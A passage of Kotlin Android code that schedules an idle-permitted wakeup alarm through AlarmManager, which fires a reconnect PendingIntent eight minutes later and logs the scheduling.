            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(AlarmManager::class.java)
        val triggerAt = SystemClock.elapsedRealtime() + 8 * 60 * 1000L
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.set(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.i(TAG, "Reconnect alarm scheduled in 8 min")
    }
}
